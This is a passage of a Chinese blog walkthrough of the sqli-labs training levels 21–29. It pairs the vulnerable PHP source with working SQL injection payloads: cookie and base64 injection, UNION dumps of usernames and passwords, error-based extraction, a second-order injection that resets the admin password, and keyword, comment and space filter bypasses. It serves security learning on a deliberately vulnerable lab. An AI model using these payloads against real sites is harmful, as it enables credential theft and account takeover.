-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        <span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);    </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">                 <span class="comment"># 对 cookee 进行 base64 解密</span></span><br><span class="line">        <span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>通过源码看出，后端会把传入的cookie中的<code>uname</code>参数进行base64解密，然后再进行查询，所以我们传入的cookie中的<code>uname</code>要尽心base64加密才行。同时注意到，这里的闭合方式为<code>(&#39;$uname&#39;)</code></p>
-<p>查询语句：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;sqlsec&#39;) union select 1,2,(SELECT GROUP_CONCAT(username,&#39;:&#39;,password) FROM users)#</span><br></pre></td></tr></table></figure>
-<p>我们可以利用hackbar进行base64加密：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSwnOicscGFzc3dvcmQpIEZST00gdXNlcnMpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304212001660.png" alt="image-20210304212001660"></p>
-<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>可以看出仅仅实在Less-21的基础上把闭合方式改为了<code>&quot;$cookee1&quot;</code>，注入方式参考Less-21</p>
-<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> 有查询结果:</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
-<p>可以看出这里使用正则匹配过滤了<code>#</code>和<code>--</code>，导致了我们无法把查询语句中参数<code>$id</code>后面的限制仅输出1个内容给屏蔽掉。这里我们可以构造语句：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,password) from users),&#39;3</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215528582.png" alt="image-20210304215528582"></p>
-<p>解释：</p>
-<ol>
-<li><p>首先是id的第一个参数为-1，因为 sql 语句执行了两个 select 语句，第一个 select 为 id 的选择语 句，第二个为我们构造的 select 语句。只有一个数据可以输出，为了让我们自己构造的数据 可以正常输出，第一个 select 要没有结果，所以-1 或者超过数据库所有数据都可以。</p>
-</li>
-<li><p>最后3前面的<code>&#39;</code>目的是闭合查询语句最后的<code>&#39;</code>，使其不会错误</p>
-</li>
-<li><p>此处也可以进行报错注入，盲注</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select extractvalue(1,concat(0x7e,(select database()),0x7e))),&#39;3</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215543764.png" alt="image-20210304215543764"></p>
-<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><ul>
-<li><p>查看代码</p>
-<ul>
-<li><strong>Index.php</strong></li>
-</ul>
-<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了。</p>
-<p>输入用户名和密码之后会把数据传输到 <strong>login.php</strong> 进行验证。点击忘记密码会跳转到<strong>forgot_password.php</strong>，点击创建新用户会跳转到<strong>new_user.php</strong>。</p>
-<ul>
-<li><strong>failed.php</strong></li>
-</ul>
-<p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p>
-<ul>
-<li><strong>forgot_password.php</strong></li>
-</ul>
-<p>简单提示：如果你忘记密码 请 hack it</p>
-<ul>
-<li><strong>login.php</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 登陆成功：</span><br><span class="line">    <span class="comment">#设置session和cookie</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure>
-<p><code>$username</code>和<code>$password</code>两个参数都被过滤掉，无法从这里进行注入。</p>
-<ul>
-<li><strong>new_user.php</strong></li>
-</ul>
-<p>创建新用户的表单页面，本文件主要存放前段代码。</p>
-<ul>
-<li><strong>login_create.php</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span></span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前用户信息</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">#如果当前用户已经存在 无法注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 两次输入密码一致：</span><br><span class="line">  <span class="comment"># 将记录插入数据库中</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br><span class="line">      查询完成后 重定向到首页</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示两次输入密码不一致</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>pass_change.php</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 检测未登录：</span><br><span class="line">    重定向到首页</span><br><span class="line"><span class="keyword">if</span> 检测到提交表单：</span><br><span class="line">  <span class="comment"># 对 pass 都进行了过滤</span></span><br><span class="line">  <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 两次密码一致:</span><br><span class="line">        <span class="comment"># 直接将 username 拼接到 SQL 语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示密码不一致 并重定向到 fail.php</span><br></pre></td></tr></table></figure></li>
-<li><p>思路分析</p>
-</li>
-</ul>
-<p>这里需要利用到二次注入。看更新密码的地方：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span><span class="comment"># and password=&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>相当于<code>#</code>后面的都被屏蔽掉了，直接修改了 admin 的用户密码。</p>
-<ul>
-<li><p>演示步骤</p>
-<ol>
-<li><p>注册一个名字为<code>admin&#39;#</code>的用户</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100428917.png" alt="image-20210305100428917"></p>
-</li>
-<li><p>注册好之后登陆该账户，对密码进行修改</p>
-</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100925703.png" alt="image-20210305100925703"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100819324.png" alt="image-20210305100819324"></p>
-</li>
-</ul>
-<p>可以看到此时admin用户的密码被修改为了000</p>
-<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><ul>
-<li>查看代码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>= blacklist(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>  可以看出后端把传进去的参数进行了过滤，把<code>or</code>和<code>and</code>不区分大小写替换为了空字符。</p>
-<ul>
-<li>or 和 and 过滤的绕过<ol>
-<li>大小写变形 Or,OR,oR</li>
-<li>编码，hex，urlencode</li>
-<li>添加注释/*or*/</li>
-<li>利用符号 and=&amp;&amp; or=||</li>
-<li>双写 oorr，anandd</li>
-</ol>
-</li>
-</ul>
-<p>由于password中含有or，所以要在里面双写</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,passwoorrd) from users),3--+</span><br></pre></td></tr></table></figure>
-<p>使用报错或者盲注时推荐使用符号</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>值得一提的是，如果使用&amp;&amp;来代替and，需要对&amp;&amp;进行url编码，否则&amp;后面的内容会被当成第二个参数传递。</p>
-</blockquote>
-<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这一关就是Less-25的小改，参数类型改为了数字型，并且屏蔽了错误信息显示。因此这里只能使用联合注入和盲注。</p>
-<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  这里过滤规则变多了，把 or，and，/*，#，–，/和空格给过滤掉 </p>
-<ul>
-<li><p>绕过方法</p>
-<ul>
-<li>之前已经提过and，or和注释符被过滤时候的绕过方法，这里不再赘述</li>
-<li>空格被过滤可以使用如下的符号来代替</li>
-</ul>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="left">符号</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">%09</td>
-<td align="left">TAB 键(水平)</td>
-</tr>
-<tr>
-<td align="left">%0a</td>
-<td align="left">新建一行</td>
-</tr>
-<tr>
-<td align="left">%0c</td>
-<td align="left">新的一页</td>
-</tr>
-<tr>
-<td align="left">%0d</td>
-<td align="left">return 功能</td>
-</tr>
-<tr>
-<td align="left">%0b</td>
-<td align="left">TAB 键(垂直)</td>
-</tr>
-<tr>
-<td align="left">%a0</td>
-<td align="left">空格</td>
-</tr>
-</tbody></table>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26&#x2F;</span><br><span class="line">?id&#x3D;100&#39;%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||&#39;1</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>该方法无法再window上实现，因为有些符号不能被解析,这里借助了在线容器进行测试</p>
-<p><a class="link"   href="https://www.vsplate.com/labs.php" >https://www.vsplate.com/labs.php<i class="fas fa-external-link-alt"></i></a></p>
-</blockquote>
-<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>与 Less-26 相比，只是拼接方式改为了<code>(&#39;$id&#39;)</code>，因为没有输出报错信息，所以不能使用报错注入了。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||(&#39;1</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br></pre></td></tr></table></figure>
-<p>这里解释一下正则匹配修饰符的含义：</p>
-<table>
-<thead>
-<tr>
-<th>模式修正符号</th>
-<th>功能描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>i</td>
-<td>在和正则匹配是不区分大小写</td>
-</tr>
-<tr>
-<td>m</td>
-<td>将字符串视为多行。(具体作用就是防止双写绕过)</td>
-</tr>
-<tr>
-<td>s</td>
-<td>如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。</td>
-</tr>
-</tbody></table>
-<p>通过源码我们知道了后端对那些字符进行了过滤，虽然这里对<code>union</code>和<code>select</code>做了部分过滤，但是任然存在可以绕过的漏洞。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27&#x2F;</span><br><span class="line">?id&#x3D;100&#39;unIon%0bSelEcT%0b1,database(),&#39;3</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>这关在Less-27的基础上，把闭合方式改为<code>&quot;$id&quot;</code>，同时屏蔽了错误信息显示，因此无法进行报错注入。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27a&#x2F;</span><br><span class="line">?id&#x3D;100&quot;unIon%0bSelEcT%0b1,database(),&quot;3</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure>
-<p>闭合方式为<code>(&#39;$id&#39;)</code>，，并且取消了select不能双写的限制，增加了对<code>union select</code>连在一起的时候且不区分大小写的过滤，且屏蔽了错误信息显示。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)uniunion%0bselecton%0bselect%0b1,database(),(&#39;3</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>本关在less-28的基础上竟然还少了前面的几个限制，只留下了最后一个对<code>union select</code>的过滤</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;) uniunion selecton select 1,database(),(&#39;3</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><ul>
-<li><p>查看源码</p>
-<ul>
-<li>index.php</li>
-</ul>
-<p>并没有什么特别的，平平无奇，使用联合注入即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;</span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+</span><br></pre></td></tr></table></figure>
-<ul>
-<li>login.php</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$id1</span>=java_implimentation(<span class="variable">$qs</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//echo $id1;</span></span><br><span class="line">whitelist(<span class="variable">$id1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span 